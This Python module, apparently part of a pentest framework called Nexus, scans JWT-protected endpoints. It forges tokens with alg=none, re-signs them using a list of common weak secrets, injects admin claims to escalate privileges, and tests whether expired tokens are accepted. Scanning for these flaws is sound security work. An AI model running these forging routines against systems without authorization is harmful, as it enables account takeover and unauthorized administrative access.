"""
Nexus v2.0 - JWT Security Testing
=================================

JWT vulnerability detection and exploitation.
"""

import asyncio
import base64
import json
import hmac
import hashlib
import logging
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from datetime import datetime, timedelta

from nexus.execution.proxy import get_proxy_client

logger = logging.getLogger(__name__)


@dataclass
class JWTFinding:
    """A JWT vulnerability finding."""
    endpoint: str
    vulnerability: str
    jwt_header: Dict[str, Any]
    jwt_payload: Dict[str, Any]
    severity: str
    attack: str
    evidence: Dict[str, Any]
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "endpoint": self.endpoint,
            "vulnerability": self.vulnerability,
            "jwt_header": self.jwt_header,
            "jwt_payload": self.jwt_payload,
            "severity": self.severity,
            "attack": self.attack,
            "evidence": self.evidence,
        }


class JWTAnalyzer:
    """
    JWT security analyzer.
    
    Vulnerabilities tested:
    1. Algorithm confusion (none, HS256)
    2. Weak secrets
    3. Key confusion (RSA -> HMAC)
    4. Claim manipulation
    5. Expired token acceptance
    """
    
    COMMON_SECRETS = [
        "secret", "password", "123456", "admin", "jwt_secret",
        "changeme", "supersecret", "test", "key", "private",
        "secret_key", "jwt", "token", "auth", "authentication",
        "your-256-bit-secret", "your_jwt_secret_key", "my-secret-key",
    ]
    
    def __init__(self):
        self.client = get_proxy_client()
    
    def decode_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        """Decode JWT without verification."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            
            # Decode header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
            }
        except Exception as e:
            logger.debug(f"JWT decode error: {e}")
            return None
    
    def encode_jwt(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: str = "",
        algorithm: str = "HS256"
    ) -> str:
        """Encode a JWT."""
        # Header
        header_json = json.dumps(header, separators=(",", ":"))
        header_b64 = base64.urlsafe_b64encode(header_json.encode()).rstrip(b"=").decode()
        
        # Payload
        payload_json = json.dumps(payload, separators=(",", ":"))
        payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b"=").decode()
        
        # Message
        message = f"{header_b64}.{payload_b64}"
        
        # Signature
        if algorithm == "none" or not secret:
            signature = ""
        elif algorithm == "HS256":
            sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            signature = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        elif algorithm == "HS384":
            sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
            signature = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        elif algorithm == "HS512":
            sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
            signature = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        else:
            signature = ""
        
        return f"{message}.{signature}"
    
    async def test_none_algorithm(
        self,
        endpoint: str,
        original_jwt: str
    ) -> Optional[JWTFinding]:
        """
        Test for algorithm=none vulnerability.
        
        CVE-2015-2951: JWT alg=none bypass
        """
        decoded = self.decode_jwt(original_jwt)
        if not decoded:
            return None
        
        # Create JWT with alg=none
        none_variants = ["none", "None", "NONE", "nOnE"]
        
        for alg in none_variants:
            forged_header = {**decoded["header"], "alg": alg}
            forged_jwt = self.encode_jwt(forged_header, decoded["payload"], algorithm="none")
            
            # Also try without signature
            forged_jwt_nosig = forged_jwt.rstrip(".")
            
            for test_jwt in [forged_jwt, forged_jwt_nosig]:
                response = await self._test_jwt(endpoint, test_jwt)
                
                if response and response.response.status_code == 200:
                    return JWTFinding(
                        endpoint=endpoint,
                        vulnerability="Algorithm None Bypass",
                        jwt_header=forged_header,
                        jwt_payload=decoded["payload"],
                        severity="critical",
                        attack=f"Changed algorithm to '{alg}'",
                        evidence={
                            "forged_jwt": test_jwt,
                            "response_status": response.response.status_code,
                        },
                    )
        
        return None
    
    async def test_weak_secret(
        self,
        endpoint: str,
        original_jwt: str
    ) -> Optional[JWTFinding]:
        """Test for weak HMAC secrets."""
        decoded = self.decode_jwt(original_jwt)
        if not decoded:
            return None
        
        alg = decoded["header"].get("alg", "HS256")
        if not alg.startswith("HS"):
            return None
        
        for secret in self.COMMON_SECRETS:
            # Re-sign with guessed secret
            forged_jwt = self.encode_jwt(
                decoded["header"],
                decoded["payload"],
                secret=secret,
                algorithm=alg
            )
            
            response = await self._test_jwt(endpoint, forged_jwt)
            
            if response and response.response.status_code == 200:
                return JWTFinding(
                    endpoint=endpoint,
                    vulnerability="Weak JWT Secret",
                    jwt_header=decoded["header"],
                    jwt_payload=decoded["payload"],
                    severity="critical",
                    attack=f"Secret guessed: '{secret}'",
                    evidence={
                        "secret": secret,
                        "forged_jwt": forged_jwt,
                    },
                )
        
        return None
    
    async def test_privilege_escalation(
        self,
        endpoint: str,
        original_jwt: str,
        secret: str = None
    ) -> Optional[JWTFinding]:
        """Test for privilege escalation via claim manipulation."""
        decoded = self.decode_jwt(original_jwt)
        if not decoded:
            return None
        
        # Common privilege claims to modify
        escalation_payloads = [
            {"role": "admin"},
            {"admin": True},
            {"is_admin": True},
            {"user_role": "administrator"},
            {"permissions": ["*"]},
            {"groups": ["admin"]},
        ]
        
        for escalation in escalation_payloads:
            modified_payload = {**decoded["payload"], **escalation}
            
            if secret:
                forged_jwt = self.encode_jwt(
                    decoded["header"],
                    modified_payload,
                    secret=secret,
                    algorithm=decoded["header"].get("alg", "HS256")
                )
            else:
                # Try without valid signature (for weak implementations)
                forged_jwt = self.encode_jwt(
                    {**decoded["header"], "alg": "none"},
                    modified_payload,
                    algorithm="none"
                )
            
            response = await self._test_jwt(endpoint, forged_jwt)
            
            if response and response.response.status_code == 200:
                # Check if we got admin access
                if "admin" in response.response.body.lower():
                    return JWTFinding(
                        endpoint=endpoint,
                        vulnerability="Privilege Escalation",
                        jwt_header=decoded["header"],
                        jwt_payload=modified_payload,
                        severity="critical",
                        attack=f"Added claims: {escalation}",
                        evidence={
                            "forged_jwt": forged_jwt,
                            "response_preview": response.response.body[:500],
                        },
                    )
        
        return None
    
    async def test_expired_token(
        self,
        endpoint: str,
        original_jwt: str
    ) -> Optional[JWTFinding]:
        """Test if expired tokens are accepted."""
        decoded = self.decode_jwt(original_jwt)
        if not decoded:
            return None
        
        payload = decoded["payload"]
        current_exp = payload.get("exp")
        
        if not current_exp:
            return None
        
        # Check if token is expired
        if current_exp < datetime.now().timestamp():
            # Token is expired, test if it still works
            response = await self._test_jwt(endpoint, original_jwt)
            
            if response and response.response.status_code == 200:
                return JWTFinding(
                    endpoint=endpoint,
                    vulnerability="Expired Token Acceptance",
                    jwt_header=decoded["header"],
                    jwt_payload=payload,
                    severity="high",
                    attack="Expired token still accepted",
                    evidence={
                        "exp_timestamp": current_exp,
                        "expired_since": datetime.now().timestamp() - current_exp,
                    },
                )
        
        return None
    
    async def _test_jwt(self, endpoint: str, jwt: str):
        """Test a JWT against an endpoint."""
        self.client.set_header("Authorization", f"Bearer {jwt}")
        return await self.client.get(endpoint)
    
    async def full_scan(
        self,
        endpoint: str,
        jwt: str
    ) -> List[JWTFinding]:
        """Run all JWT tests."""
        findings = []
        
        logger.info(f"🔐 Testing JWT on {endpoint}")
        
        # Decode and log JWT info
        decoded = self.decode_jwt(jwt)
        if decoded:
            logger.debug(f"JWT Algorithm: {decoded['header'].get('alg')}")
            logger.debug(f"JWT Claims: {decoded['payload'].keys()}")
        
        # Run all tests
        tests = [
            self.test_none_algorithm(endpoint, jwt),
            self.test_weak_secret(endpoint, jwt),
            self.test_expired_token(endpoint, jwt),
            self.test_privilege_escalation(endpoint, jwt),
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if isinstance(result, JWTFinding):
                findings.append(result)
                logger.info(f"🎯 JWT Vuln: {result.vulnerability}")
        
        return findings


# Quick access
async def scan_jwt(
    endpoint: str,
    jwt: str
) -> List[JWTFinding]:
    """Quick JWT security scan."""
    analyzer = JWTAnalyzer()
    return await analyzer.full_scan(endpoint, jwt)
